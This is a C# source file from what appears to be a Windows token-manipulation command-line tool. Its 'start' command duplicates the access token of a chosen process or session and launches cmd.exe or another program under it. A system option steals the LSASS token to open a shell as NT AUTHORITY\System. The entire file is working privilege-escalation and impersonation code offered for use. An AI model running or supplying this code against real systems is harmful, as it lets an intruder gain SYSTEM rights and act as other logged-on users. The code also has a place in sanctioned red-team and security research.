using CommandLine;
using System;
using System.Linq;
using TokenManage;
using TokenManage.Domain;
using TokenManage.Domain.AccessTokenInfo;
using TokenManage.API;

namespace TokenManageCLI
{

    [Verb("start", HelpText = "Starts a new process")]
    public class StartProcessOptions : BaseOptions
    {
        [Option('p', "process", Required = false, HelpText = "ID of process to duplicate access token from.")]
        public int? ProcessID { get; set; }

        [Option('a', "application", Required = false, HelpText = @"Specify the application to run. Defaults to cmd.exe.")]
        public string ApplicationName { get; set; }

        [Option('c', "command", Required = false, Default = null, HelpText = "The command arguments to use.")]
        public string CommandLine { get; set; }

        [Option('s', "system", Required = false, Default = false, HelpText = "Automatically attempts to open a CMD shell running as NT AUTHORITY\\System")]
        public bool System { get; set; }

        [Option('S', "session", Required = false, Default = 0, HelpText = "Starts a process using the token connected to the specified session id.")]
        public uint SessionId { get; set; }
    }

    public class StartProcess
    {

        private ConsoleOutput console;
        private StartProcessOptions options;

        public StartProcess(StartProcessOptions options, ConsoleOutput console)
        {
            this.options = options;
            this.console = console;
        }


        public void Execute()
        {
            if(this.options.ProcessID.HasValue)
            {
                BorrowProcessToken(this.options.ProcessID.Value);
            }
            else if(this.options.System)
            {
                var processes = TMProcess.GetProcessByName("lsass");
                if(processes.Count == 0)
                {
                    console.Error("Failed to find LSASS process. That is weird.");
                    return;
                }
                else if(processes.Count > 1)
                {
                    console.Error("Found multiple LSASS processes. That is weird.");
                    return;
                }
                else
                {
                    var lsassProcess = processes.First();
                    BorrowProcessToken(lsassProcess.ProcessId);
                }
            }
            else
            {
                BorrowSessionToken(this.options.SessionId);
            }
        }

        public void BorrowSessionToken(uint sessionId)
        {
            var hToken = AccessTokenHandle.FromSessionId(sessionId);

            var hDuplicate = AccessTokenHandle.Duplicate(hToken, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, TokenAccess.TOKEN_ALL_ACCESS);
            
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi;
            this.console.Debug($"Starting new process.");
            string applicationName = Environment.GetEnvironmentVariable("WINDIR") + @"\System32\cmd.exe";
            if (this.options.ApplicationName != null)
            {
                applicationName = this.options.ApplicationName;
            }
            this.console.Debug($"Starting with application: {applicationName}");

            if (!Advapi32.CreateProcessWithTokenW(hDuplicate.GetHandle(), LogonFlags.NetCredentialsOnly, applicationName, this.options.CommandLine, CreationFlags.NewConsole, IntPtr.Zero, @"C:\", ref si, out pi))
            {
                this.console.Error($"Failed to create shell. CreateProcessWithTokenW failed with error code: {Kernel32.GetLastError()}");
                return;
            }
        }

        public void BorrowProcessToken(int pid)
        {
            this.console.Debug($"Attempting to open handle to process with id {pid}");

            var hProc = TMProcessHandle.FromProcessId(pid, ProcessAccessFlags.QueryInformation);

            this.console.Debug($"Successfully retrieved process handle.");

            uint desiredAccess = Constants.TOKEN_IMPERSONATE;
            desiredAccess |= Constants.TOKEN_QUERY;
            desiredAccess |= Constants.TOKEN_DUPLICATE;
            desiredAccess |= Constants.TOKEN_ASSIGN_PRIMARY;
            var hToken = AccessTokenHandle.FromProcessHandle(hProc, TokenAccess.TOKEN_IMPERSONATE,
                TokenAccess.TOKEN_QUERY, TokenAccess.TOKEN_DUPLICATE, TokenAccess.TOKEN_ASSIGN_PRIMARY);
            this.console.Debug($"Successfully retrieved process access token handle.");

            var hDuplicate = AccessTokenHandle.Duplicate(hToken, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, TokenAccess.TOKEN_ALL_ACCESS);

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi;
            this.console.Debug($"Starting new process.");
            string applicationName = Environment.GetEnvironmentVariable("WINDIR") + @"\System32\cmd.exe";
            if (this.options.ApplicationName != null)
            {
                applicationName = this.options.ApplicationName;
            }
            this.console.Debug($"Starting with application: {applicationName}");

            if (!Advapi32.CreateProcessWithTokenW(hDuplicate.GetHandle(), LogonFlags.NetCredentialsOnly, applicationName, this.options.CommandLine, CreationFlags.NewConsole, IntPtr.Zero, @"C:\", ref si, out pi))
            {
                this.console.Error($"Failed to create shell. CreateProcessWithTokenW failed with error code: {Kernel32.GetLastError()}");
                return;
            }
        }
    }
}
